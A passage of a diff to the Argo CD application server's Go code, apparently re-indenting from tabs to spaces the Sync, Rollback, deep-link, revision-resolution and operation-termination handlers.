a.DeletionTimestamp != nil {\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"application is deleting\")\n-\t}\n-\tif a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil && !syncReq.GetDryRun() {\n-\t\tif syncReq.GetRevision() != \"\" && syncReq.GetRevision() != text.FirstNonEmpty(source.TargetRevision, \"HEAD\") {\n-\t\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"Cannot sync to %s: auto-sync currently set to %s\", syncReq.GetRevision(), source.TargetRevision)\n-\t\t}\n-\t}\n-\trevision, displayRevision, err := s.resolveRevision(ctx, a, syncReq)\n-\tif err != nil {\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, err.Error())\n-\t}\n-\n-\tvar retry *appv1.RetryStrategy\n-\tvar syncOptions appv1.SyncOptions\n-\tif a.Spec.SyncPolicy != nil {\n-\t\tsyncOptions = a.Spec.SyncPolicy.SyncOptions\n-\t\tretry = a.Spec.SyncPolicy.Retry\n-\t}\n-\tif syncReq.RetryStrategy != nil {\n-\t\tretry = syncReq.RetryStrategy\n-\t}\n-\tif syncReq.SyncOptions != nil {\n-\t\tsyncOptions = syncReq.SyncOptions.Items\n-\t}\n-\n-\t// We cannot use local manifests if we're only allowed to sync to signed commits\n-\tif syncReq.Manifests != nil && len(proj.Spec.SignatureKeys) > 0 {\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"Cannot use local sync when signature keys are required.\")\n-\t}\n-\n-\tresources := []appv1.SyncOperationResource{}\n-\tif syncReq.GetResources() != nil {\n-\t\tfor _, r := range syncReq.GetResources() {\n-\t\t\tif r != nil {\n-\t\t\t\tresources = append(resources, *r)\n-\t\t\t}\n-\t\t}\n-\t}\n-\top := appv1.Operation{\n-\t\tSync: &appv1.SyncOperation{\n-\t\t\tRevision:     revision,\n-\t\t\tPrune:        syncReq.GetPrune(),\n-\t\t\tDryRun:       syncReq.GetDryRun(),\n-\t\t\tSyncOptions:  syncOptions,\n-\t\t\tSyncStrategy: syncReq.Strategy,\n-\t\t\tResources:    resources,\n-\t\t\tManifests:    syncReq.Manifests,\n-\t\t},\n-\t\tInitiatedBy: appv1.OperationInitiator{Username: session.Username(ctx)},\n-\t\tInfo:        syncReq.Infos,\n-\t}\n-\tif retry != nil {\n-\t\top.Retry = *retry\n-\t}\n-\n-\tappName := syncReq.GetName()\n-\tappNs := s.appNamespaceOrDefault(syncReq.GetAppNamespace())\n-\tappIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n-\ta, err = argo.SetAppOperation(appIf, appName, &op)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error setting app operation: %w\", err)\n-\t}\n-\tpartial := \"\"\n-\tif len(syncReq.Resources) > 0 {\n-\t\tpartial = \"partial \"\n-\t}\n-\treason := fmt.Sprintf(\"initiated %ssync to %s\", partial, displayRevision)\n-\tif syncReq.Manifests != nil {\n-\t\treason = fmt.Sprintf(\"initiated %ssync locally\", partial)\n-\t}\n-\ts.logAppEvent(a, ctx, argo.EventReasonOperationStarted, reason)\n-\treturn a, nil\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, syncReq.GetProject(), syncReq.GetAppNamespace(), syncReq.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        return a, status.Errorf(codes.InvalidArgument, \"application references project %s which does not exist\", a.Spec.Project)\n+                }\n+                return a, fmt.Errorf(\"error getting app project: %w\", err)\n+        }\n+\n+        s.inferResourcesStatusHealth(a)\n+\n+        if !proj.Spec.SyncWindows.Matches(a).CanSync(true) {\n+                return a, status.Errorf(codes.PermissionDenied, \"cannot sync: blocked by sync window\")\n+        }\n+\n+        if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionSync, a.RBACName(s.ns)); err != nil {\n+                return nil, err\n+        }\n+\n+        source := a.Spec.GetSource()\n+\n+        if syncReq.Manifests != nil {\n+                if err := s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacpolicy.ActionOverride, a.RBACName(s.ns)); err != nil {\n+                        return nil, err\n+                }\n+                if a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil && !syncReq.GetDryRun() {\n+                        return nil, status.Error(codes.FailedPrecondition, \"cannot use local sync when Automatic Sync Policy is enabled unless for dry run\")\n+                }\n+        }\n+        if a.DeletionTimestamp != nil {\n+                return nil, status.Errorf(codes.FailedPrecondition, \"application is deleting\")\n+        }\n+        if a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil && !syncReq.GetDryRun() {\n+                if syncReq.GetRevision() != \"\" && syncReq.GetRevision() != text.FirstNonEmpty(source.TargetRevision, \"HEAD\") {\n+                        return nil, status.Errorf(codes.FailedPrecondition, \"Cannot sync to %s: auto-sync currently set to %s\", syncReq.GetRevision(), source.TargetRevision)\n+                }\n+        }\n+        revision, displayRevision, err := s.resolveRevision(ctx, a, syncReq)\n+        if err != nil {\n+                return nil, status.Errorf(codes.FailedPrecondition, err.Error())\n+        }\n+\n+        var retry *appv1.RetryStrategy\n+        var syncOptions appv1.SyncOptions\n+        if a.Spec.SyncPolicy != nil {\n+                syncOptions = a.Spec.SyncPolicy.SyncOptions\n+                retry = a.Spec.SyncPolicy.Retry\n+        }\n+        if syncReq.RetryStrategy != nil {\n+                retry = syncReq.RetryStrategy\n+        }\n+        if syncReq.SyncOptions != nil {\n+                syncOptions = syncReq.SyncOptions.Items\n+        }\n+\n+        // We cannot use local manifests if we're only allowed to sync to signed commits\n+        if syncReq.Manifests != nil && len(proj.Spec.SignatureKeys) > 0 {\n+                return nil, status.Errorf(codes.FailedPrecondition, \"Cannot use local sync when signature keys are required.\")\n+        }\n+\n+        resources := []appv1.SyncOperationResource{}\n+        if syncReq.GetResources() != nil {\n+                for _, r := range syncReq.GetResources() {\n+                        if r != nil {\n+                                resources = append(resources, *r)\n+                        }\n+                }\n+        }\n+        op := appv1.Operation{\n+                Sync: &appv1.SyncOperation{\n+                        Revision:     revision,\n+                        Prune:        syncReq.GetPrune(),\n+                        DryRun:       syncReq.GetDryRun(),\n+                        SyncOptions:  syncOptions,\n+                        SyncStrategy: syncReq.Strategy,\n+                        Resources:    resources,\n+                        Manifests:    syncReq.Manifests,\n+                },\n+                InitiatedBy: appv1.OperationInitiator{Username: session.Username(ctx)},\n+                Info:        syncReq.Infos,\n+        }\n+        if retry != nil {\n+                op.Retry = *retry\n+        }\n+\n+        appName := syncReq.GetName()\n+        appNs := s.appNamespaceOrDefault(syncReq.GetAppNamespace())\n+        appIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n+        a, err = argo.SetAppOperation(appIf, appName, &op)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error setting app operation: %w\", err)\n+        }\n+        partial := \"\"\n+        if len(syncReq.Resources) > 0 {\n+                partial = \"partial \"\n+        }\n+        reason := fmt.Sprintf(\"initiated %ssync to %s\", partial, displayRevision)\n+        if syncReq.Manifests != nil {\n+                reason = fmt.Sprintf(\"initiated %ssync locally\", partial)\n+        }\n+        s.logAppEvent(a, ctx, argo.EventReasonOperationStarted, reason)\n+        return a, nil\n }\n \n func (s *Server) Rollback(ctx context.Context, rollbackReq *application.ApplicationRollbackRequest) (*appv1.Application, error) {\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionSync, rollbackReq.GetProject(), rollbackReq.GetAppNamespace(), rollbackReq.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\ts.inferResourcesStatusHealth(a)\n-\n-\tif a.DeletionTimestamp != nil {\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"application is deleting\")\n-\t}\n-\tif a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil {\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"rollback cannot be initiated when auto-sync is enabled\")\n-\t}\n-\n-\tvar deploymentInfo *appv1.RevisionHistory\n-\tfor _, info := range a.Status.History {\n-\t\tif info.ID == rollbackReq.GetId() {\n-\t\t\tdeploymentInfo = &info\n-\t\t\tbreak\n-\t\t}\n-\t}\n-\tif deploymentInfo == nil {\n-\t\treturn nil, status.Errorf(codes.InvalidArgument, \"application %s does not have deployment with id %v\", a.QualifiedName(), rollbackReq.GetId())\n-\t}\n-\tif deploymentInfo.Source.IsZero() {\n-\t\t// Since source type was introduced to history starting with v0.12, and is now required for\n-\t\t// rollback, we cannot support rollback to revisions deployed using Argo CD v0.11 or below\n-\t\treturn nil, status.Errorf(codes.FailedPrecondition, \"cannot rollback to revision deployed with Argo CD v0.11 or lower. sync to revision instead.\")\n-\t}\n-\n-\tvar syncOptions appv1.SyncOptions\n-\tif a.Spec.SyncPolicy != nil {\n-\t\tsyncOptions = a.Spec.SyncPolicy.SyncOptions\n-\t}\n-\n-\t// Rollback is just a convenience around Sync\n-\top := appv1.Operation{\n-\t\tSync: &appv1.SyncOperation{\n-\t\t\tRevision:     deploymentInfo.Revision,\n-\t\t\tDryRun:       rollbackReq.GetDryRun(),\n-\t\t\tPrune:        rollbackReq.GetPrune(),\n-\t\t\tSyncOptions:  syncOptions,\n-\t\t\tSyncStrategy: &appv1.SyncStrategy{Apply: &appv1.SyncStrategyApply{}},\n-\t\t\tSource:       &deploymentInfo.Source,\n-\t\t},\n-\t\tInitiatedBy: appv1.OperationInitiator{Username: session.Username(ctx)},\n-\t}\n-\tappName := rollbackReq.GetName()\n-\tappNs := s.appNamespaceOrDefault(rollbackReq.GetAppNamespace())\n-\tappIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n-\ta, err = argo.SetAppOperation(appIf, appName, &op)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error setting app operation: %w\", err)\n-\t}\n-\ts.logAppEvent(a, ctx, argo.EventReasonOperationStarted, fmt.Sprintf(\"initiated rollback to %d\", rollbackReq.GetId()))\n-\treturn a, nil\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionSync, rollbackReq.GetProject(), rollbackReq.GetAppNamespace(), rollbackReq.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        s.inferResourcesStatusHealth(a)\n+\n+        if a.DeletionTimestamp != nil {\n+                return nil, status.Errorf(codes.FailedPrecondition, \"application is deleting\")\n+        }\n+        if a.Spec.SyncPolicy != nil && a.Spec.SyncPolicy.Automated != nil {\n+                return nil, status.Errorf(codes.FailedPrecondition, \"rollback cannot be initiated when auto-sync is enabled\")\n+        }\n+\n+        var deploymentInfo *appv1.RevisionHistory\n+        for _, info := range a.Status.History {\n+                if info.ID == rollbackReq.GetId() {\n+                        deploymentInfo = &info\n+                        break\n+                }\n+        }\n+        if deploymentInfo == nil {\n+                return nil, status.Errorf(codes.InvalidArgument, \"application %s does not have deployment with id %v\", a.QualifiedName(), rollbackReq.GetId())\n+        }\n+        if deploymentInfo.Source.IsZero() {\n+                // Since source type was introduced to history starting with v0.12, and is now required for\n+                // rollback, we cannot support rollback to revisions deployed using Argo CD v0.11 or below\n+                return nil, status.Errorf(codes.FailedPrecondition, \"cannot rollback to revision deployed with Argo CD v0.11 or lower. sync to revision instead.\")\n+        }\n+\n+        var syncOptions appv1.SyncOptions\n+        if a.Spec.SyncPolicy != nil {\n+                syncOptions = a.Spec.SyncPolicy.SyncOptions\n+        }\n+\n+        // Rollback is just a convenience around Sync\n+        op := appv1.Operation{\n+                Sync: &appv1.SyncOperation{\n+                        Revision:     deploymentInfo.Revision,\n+                        DryRun:       rollbackReq.GetDryRun(),\n+                        Prune:        rollbackReq.GetPrune(),\n+                        SyncOptions:  syncOptions,\n+                        SyncStrategy: &appv1.SyncStrategy{Apply: &appv1.SyncStrategyApply{}},\n+                        Source:       &deploymentInfo.Source,\n+                },\n+                InitiatedBy: appv1.OperationInitiator{Username: session.Username(ctx)},\n+        }\n+        appName := rollbackReq.GetName()\n+        appNs := s.appNamespaceOrDefault(rollbackReq.GetAppNamespace())\n+        appIf := s.appclientset.ArgoprojV1alpha1().Applications(appNs)\n+        a, err = argo.SetAppOperation(appIf, appName, &op)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error setting app operation: %w\", err)\n+        }\n+        s.logAppEvent(a, ctx, argo.EventReasonOperationStarted, fmt.Sprintf(\"initiated rollback to %d\", rollbackReq.GetId()))\n+        return a, nil\n }\n \n func (s *Server) ListLinks(ctx context.Context, req *application.ListAppLinksRequest) (*application.LinksResponse, error) {\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, req.GetProject(), req.GetNamespace(), req.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tobj, err := kube.ToUnstructured(a)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting application: %w\", err)\n-\t}\n-\n-\tdeepLinks, err := s.settingsMgr.GetDeepLinks(settings.ApplicationDeepLinks)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to read application deep links from configmap: %w\", err)\n-\t}\n-\n-\tclstObj, _, err := s.getObjectsForDeepLinks(ctx, a)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tdeepLinksObject := deeplinks.CreateDeepLinksObject(nil, obj, clstObj, nil)\n-\n-\tfinalList, errorList := deeplinks.EvaluateDeepLinksResponse(deepLinksObject, obj.GetName(), deepLinks)\n-\tif len(errorList) > 0 {\n-\t\tlog.Errorf(\"errorList while evaluating application deep links, %v\", strings.Join(errorList, \", \"))\n-\t}\n-\n-\treturn finalList, nil\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, req.GetProject(), req.GetNamespace(), req.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        obj, err := kube.ToUnstructured(a)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting application: %w\", err)\n+        }\n+\n+        deepLinks, err := s.settingsMgr.GetDeepLinks(settings.ApplicationDeepLinks)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to read application deep links from configmap: %w\", err)\n+        }\n+\n+        clstObj, _, err := s.getObjectsForDeepLinks(ctx, a)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        deepLinksObject := deeplinks.CreateDeepLinksObject(nil, obj, clstObj, nil)\n+\n+        finalList, errorList := deeplinks.EvaluateDeepLinksResponse(deepLinksObject, obj.GetName(), deepLinks)\n+        if len(errorList) > 0 {\n+                log.Errorf(\"errorList while evaluating application deep links, %v\", strings.Join(errorList, \", \"))\n+        }\n+\n+        return finalList, nil\n }\n \n func (s *Server) getObjectsForDeepLinks(ctx context.Context, app *appv1.Application) (cluster *unstructured.Unstructured, project *unstructured.Unstructured, err error) {\n-\tproj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\treturn nil, nil, fmt.Errorf(\"error getting app project: %w\", err)\n-\t}\n-\n-\t// sanitize project jwt tokens\n-\tproj.Status = appv1.AppProjectStatus{}\n-\n-\tproject, err = kube.ToUnstructured(proj)\n-\tif err != nil {\n-\t\treturn nil, nil, err\n-\t}\n-\n-\tgetProjectClusters := func(project string) ([]*appv1.Cluster, error) {\n-\t\treturn s.db.GetProjectClusters(ctx, project)\n-\t}\n-\n-\tif err := argo.ValidateDestination(ctx, &app.Spec.Destination, s.db); err != nil {\n-\t\tlog.WithFields(map[string]interface{}{\n-\t\t\t\"application\": app.GetName(),\n-\t\t\t\"ns\":          app.GetNamespace(),\n-\t\t\t\"destination\": app.Spec.Destination,\n-\t\t}).Warnf(\"cannot validate cluster, error=%v\", err.Error())\n-\t\treturn nil, nil, nil\n-\t}\n-\n-\tpermitted, err := proj.IsDestinationPermitted(app.Spec.Destination, getProjectClusters)\n-\tif err != nil {\n-\t\treturn nil, nil, err\n-\t}\n-\tif !permitted {\n-\t\treturn nil, nil, fmt.Errorf(\"error getting destination cluster\")\n-\t}\n-\tclst, err := s.db.GetCluster(ctx, app.Spec.Destination.Server)\n-\tif err != nil {\n-\t\tlog.WithFields(map[string]interface{}{\n-\t\t\t\"application\": app.GetName(),\n-\t\t\t\"ns\":          app.GetNamespace(),\n-\t\t\t\"destination\": app.Spec.Destination,\n-\t\t}).Warnf(\"cannot get cluster from db, error=%v\", err.Error())\n-\t\treturn nil, nil, nil\n-\t}\n-\t// sanitize cluster, remove cluster config creds and other unwanted fields\n-\tcluster, err = deeplinks.SanitizeCluster(clst)\n-\treturn cluster, project, err\n+        proj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                return nil, nil, fmt.Errorf(\"error getting app project: %w\", err)\n+        }\n+\n+        // sanitize project jwt tokens\n+        proj.Status = appv1.AppProjectStatus{}\n+\n+        project, err = kube.ToUnstructured(proj)\n+        if err != nil {\n+                return nil, nil, err\n+        }\n+\n+        getProjectClusters := func(project string) ([]*appv1.Cluster, error) {\n+                return s.db.GetProjectClusters(ctx, project)\n+        }\n+\n+        if err := argo.ValidateDestination(ctx, &app.Spec.Destination, s.db); err != nil {\n+                log.WithFields(map[string]interface{}{\n+                        \"application\": app.GetName(),\n+                        \"ns\":          app.GetNamespace(),\n+                        \"destination\": app.Spec.Destination,\n+                }).Warnf(\"cannot validate cluster, error=%v\", err.Error())\n+                return nil, nil, nil\n+        }\n+\n+        permitted, err := proj.IsDestinationPermitted(app.Spec.Destination, getProjectClusters)\n+        if err != nil {\n+                return nil, nil, err\n+        }\n+        if !permitted {\n+                return nil, nil, fmt.Errorf(\"error getting destination cluster\")\n+        }\n+        clst, err := s.db.GetCluster(ctx, app.Spec.Destination.Server)\n+        if err != nil {\n+                log.WithFields(map[string]interface{}{\n+                        \"application\": app.GetName(),\n+                        \"ns\":          app.GetNamespace(),\n+                        \"destination\": app.Spec.Destination,\n+                }).Warnf(\"cannot get cluster from db, error=%v\", err.Error())\n+                return nil, nil, nil\n+        }\n+        // sanitize cluster, remove cluster config creds and other unwanted fields\n+        cluster, err = deeplinks.SanitizeCluster(clst)\n+        return cluster, project, err\n }\n \n func (s *Server) ListResourceLinks(ctx context.Context, req *application.ApplicationResourceRequest) (*application.LinksResponse, error) {\n-\tobj, _, app, _, err := s.getUnstructuredLiveResourceOrApp(ctx, rbacpolicy.ActionGet, req)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tdeepLinks, err := s.settingsMgr.GetDeepLinks(settings.ResourceDeepLinks)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to read application deep links from configmap: %w\", err)\n-\t}\n-\n-\tobj, err = replaceSecretValues(obj)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n-\t}\n-\n-\tappObj, err := kube.ToUnstructured(app)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclstObj, projObj, err := s.getObjectsForDeepLinks(ctx, app)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tdeepLinksObject := deeplinks.CreateDeepLinksObject(obj, appObj, clstObj, projObj)\n-\tfinalList, errorList := deeplinks.EvaluateDeepLinksResponse(deepLinksObject, obj.GetName(), deepLinks)\n-\tif len(errorList) > 0 {\n-\t\tlog.Errorf(\"errors while evaluating resource deep links, %v\", strings.Join(errorList, \", \"))\n-\t}\n-\n-\treturn finalList, nil\n+        obj, _, app, _, err := s.getUnstructuredLiveResourceOrApp(ctx, rbacpolicy.ActionGet, req)\n+        if err != nil {\n+                return nil, err\n+        }\n+        deepLinks, err := s.settingsMgr.GetDeepLinks(settings.ResourceDeepLinks)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to read application deep links from configmap: %w\", err)\n+        }\n+\n+        obj, err = replaceSecretValues(obj)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error replacing secret values: %w\", err)\n+        }\n+\n+        appObj, err := kube.ToUnstructured(app)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        clstObj, projObj, err := s.getObjectsForDeepLinks(ctx, app)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        deepLinksObject := deeplinks.CreateDeepLinksObject(obj, appObj, clstObj, projObj)\n+        finalList, errorList := deeplinks.EvaluateDeepLinksResponse(deepLinksObject, obj.GetName(), deepLinks)\n+        if len(errorList) > 0 {\n+                log.Errorf(\"errors while evaluating resource deep links, %v\", strings.Join(errorList, \", \"))\n+        }\n+\n+        return finalList, nil\n }\n \n // resolveRevision resolves the revision specified either in the sync request, or the\n // application source, into a concrete revision that will be used for a sync operation.\n func (s *Server) resolveRevision(ctx context.Context, app *appv1.Application, syncReq *application.ApplicationSyncRequest) (string, string, error) {\n-\tif syncReq.Manifests != nil {\n-\t\treturn \"\", \"\", nil\n-\t}\n-\tambiguousRevision := syncReq.GetRevision()\n-\tif ambiguousRevision == \"\" {\n-\t\tambiguousRevision = app.Spec.GetSource().TargetRevision\n-\t}\n-\trepo, err := s.db.GetRepository(ctx, app.Spec.GetSource().RepoURL)\n-\tif err != nil {\n-\t\treturn \"\", \"\", fmt.Errorf(\"error getting repository by URL: %w\", err)\n-\t}\n-\tconn, repoClient, err := s.repoClientset.NewRepoServerClient()\n-\tif err != nil {\n-\t\treturn \"\", \"\", fmt.Errorf(\"error getting repo server client: %w\", err)\n-\t}\n-\tdefer ioutil.Close(conn)\n-\n-\tsource := app.Spec.GetSource()\n-\tif !source.IsHelm() {\n-\t\tif git.IsCommitSHA(ambiguousRevision) {\n-\t\t\t// If it's already a commit SHA, then no need to look it up\n-\t\t\treturn ambiguousRevision, ambiguousRevision, nil\n-\t\t}\n-\t}\n-\n-\tresolveRevisionResponse, err := repoClient.ResolveRevision(ctx, &apiclient.ResolveRevisionRequest{\n-\t\tRepo:              repo,\n-\t\tApp:               app,\n-\t\tAmbiguousRevision: ambiguousRevision,\n-\t})\n-\tif err != nil {\n-\t\treturn \"\", \"\", fmt.Errorf(\"error resolving repo revision: %w\", err)\n-\t}\n-\treturn resolveRevisionResponse.Revision, resolveRevisionResponse.AmbiguousRevision, nil\n+        if syncReq.Manifests != nil {\n+                return \"\", \"\", nil\n+        }\n+        ambiguousRevision := syncReq.GetRevision()\n+        if ambiguousRevision == \"\" {\n+                ambiguousRevision = app.Spec.GetSource().TargetRevision\n+        }\n+        repo, err := s.db.GetRepository(ctx, app.Spec.GetSource().RepoURL)\n+        if err != nil {\n+                return \"\", \"\", fmt.Errorf(\"error getting repository by URL: %w\", err)\n+        }\n+        conn, repoClient, err := s.repoClientset.NewRepoServerClient()\n+        if err != nil {\n+                return \"\", \"\", fmt.Errorf(\"error getting repo server client: %w\", err)\n+        }\n+        defer ioutil.Close(conn)\n+\n+        source := app.Spec.GetSource()\n+        if !source.IsHelm() {\n+                if git.IsCommitSHA(ambiguousRevision) {\n+                        // If it's already a commit SHA, then no need to look it up\n+                        return ambiguousRevision, ambiguousRevision, nil\n+                }\n+        }\n+\n+        resolveRevisionResponse, err := repoClient.ResolveRevision(ctx, &apiclient.ResolveRevisionRequest{\n+                Repo:              repo,\n+                App:               app,\n+                AmbiguousRevision: ambiguousRevision,\n+        })\n+        if err != nil {\n+                return \"\", \"\", fmt.Errorf(\"error resolving repo revision: %w\", err)\n+        }\n+        return resolveRevisionResponse.Revision, resolveRevisionResponse.AmbiguousRevision, nil\n }\n \n func (s *Server) TerminateOperation(ctx context.Context, termOpReq *application.OperationTerminateRequest) (*application.OperationTerminateResponse, error) {\n-\tappName := termOpReq.GetName()\n-\tappNs := s.appNamespaceOrDefault(termOpReq.GetAppNamespace())\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionSync, termOpReq.GetProject(), appNs, appName, \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tfor i := 0; i < 10; i++ {\n-\t\tif a.Operation == nil || a.Status.OperationState == nil {\n-\t\t\treturn nil, status.Errorf(codes.InvalidArgument, \"Unable to terminate operation. No operation is in progress\")\n-\t\t}\n-\t\ta.Status.OperationState.Phase = common.OperationTerminating\n-\t\tupdated, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Update(ctx, a, metav1.UpdateOptions{})\n-\t\tif err == nil {\n-\t\t\ts.waitSync(updated)\n-\t\t\ts.logAppEvent(a, ctx, argo.EventReasonResourceUpdated, \"terminated running operation\")\n-\t\t\treturn &application.OperationTerminateResponse{}, nil\n-\t\t}\n-\t\tif !apierr.IsConflict(err) {\n-\t\t\treturn nil, fmt.Errorf(\"error updating application: %w\", err)\n-\t\t}\n-\t\tlog.Warnf(\"failed to set operation for app %q due to update conflict. retrying again...\", *termOpReq.Name)\n-\t\ttime.Sleep(100 * time.Millisecond)\n-\t\ta, err = s.appclientset.ArgoprojV1alpha1().Applications(appNs).Get(ctx, appName, metav1.GetOptions{})\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error getting application by name: %w\", err)\n-\t\t}\n-\t}\n-\treturn nil, status.Errorf(codes.Internal, \"Failed to terminate app. Too many conflicts\")\n+        appName := termOpReq.GetName()\n+        appNs := s.appNamespaceOrDefault(termOpReq.GetAppNamespace())\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionSync, termOpReq.GetProject(), appNs, appName, \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        for i := 0; i < 10; i++ {\n+                if a.Operation == nil || a.Status.OperationState == nil {\n+                        return nil, status.Errorf(codes.InvalidArgument, \"Unable to terminate operation. No operation is in progress\")\n+                }\n+                a.Status.OperationState.Phase = common.OperationTerminating\n+                updated, err := s.appclientset.ArgoprojV1alpha1().Applications(appNs).Update(ctx, a, metav1.UpdateOptions{})\n+                if err == nil {\n+                        s.waitSync(updated)\n+                        s.logAppEvent(a, ctx, argo.EventReasonResourceUpdated, \"terminated running operation\")\n+                        return &application.OperationTerminateResponse{}, nil\n+                }\n+                if !apierr.IsConflict(err) {\n+                        return nil, fmt.Errorf(\"error updating application: %w\", err)\n+                }\n+                log.Warnf(\"failed to set operation for app %q due to update conflict. retrying again...\", *termOpReq.Name)\n+                time.Sleep(100 * time.Millisecond)\n+                a, err = s.appclientset.ArgoprojV1alpha1().Applications(appNs).Get(ctx, appName, metav1.GetOptions{})\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error getting application by name: %w\", err)\n+                }\n+        }\n+        return nil, status.Errorf(codes.Internal, \"Failed to terminate app. Too many conflicts\")\n }\n \n func (s *Server) logAppEvent(a *appv1.Application, ctx context.Context, reason string, action string) {\n-\teventInfo := argo.EventInfo{Type: v1.EventTypeNormal, Reason: reason}\n-\tuser := session.Username(ctx)\n-\tif user == \"\" {\n-\t\tuser = \"Unknown user\"\n-\t}\n-\tmessage := fmt.Sprintf(\"%s %s\", user, action)\n-\ts.auditLogger.LogAppEvent(a, eventInfo, message, user)\n+        eventInfo := argo.EventInfo{Type: v1.EventTypeNormal, Reason: reason}\n+        user := session.Username(ctx)\n+        if user == \"\" {\n+                user = \"Unknown user\"\n+        }\n+        message := fmt.Sprintf(\"%s %s\", user, action)\n+        s.auditLogger.LogAppEvent(a, eventInfo, message, user)\n }\n \n func (s *Server) logResourceEvent(res *appv1.ResourceNode, ctx context.Context, reason string, action string) {\n-\teventInfo := argo.EventInfo{Type: v1.EventTypeNormal, Reason: reason}\n-\tuser := session.Username(ctx)\n-\tif user == \"\" {\n-\t\tuser = \"Unknown user\"\n-\t}\n-\tmessage := fmt.Sprintf(\"%s %s\", user, action)\n-\ts.auditLogger.LogResourceEvent(res, eventInfo, message, user)\n+        eventInfo := argo.EventInfo{Type: v1.EventTypeNormal, Reason: reason}\n+        user := session.Username(ctx)\n+        if user == \"\" {\n+                user = \"Unknown user\"\n+        }\n+        message := fmt.Sprintf(\"%s %s\", user, action)\n+        s.auditLogger.LogResourceEvent(res, eventInfo, message, user)\n }\n \n func (s *Server) ListResourceActions(ctx context.Context, q *application.ApplicationResourceRequest) (*application.ResourceActionsListResponse, error) {\n-\tobj, _, _, _, err := s.getUnstructuredLiveResourceOrApp(ctx, rbacpolicy.ActionGet, q)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tresourceOverrides, err := s.settingsMgr.GetResourceOverrides()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting resource overrides: %w\", err)\n-\t}\n-\n-\tavailableActions, err := s.getAvailableActions(resourceOverrides, obj)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting available actions: %w\", err)\n-\t}\n-\tactionsPtr := []*appv1.ResourceAction{}\n-\tfor i := range availableActions {\n-\t\tactionsPtr = append(actionsPtr, &availableActions[i])\n-\t}\n-\n-\treturn &application.ResourceActionsListResponse{Actions: actionsPtr}, nil\n+        obj, _, _, _, err := s.getUnstructuredLiveResourceOrApp(ctx, rbacpolicy.ActionGet, q)\n+        if err != nil {\n+                return nil, err\n+        }\n+        resourceOverrides, err := s.settingsMgr.GetResourceOverrides()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting resource overrides: %w\", err)\n+        }\n+\n+        availableActions, err := s.getAvailableActions(resourceOverrides, obj)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting available actions: %w\", err)\n+        }\n+        actionsPtr := []*appv1.ResourceAction{}\n+        for i := range availableActions {\n+                actionsPtr = append(actionsPtr, 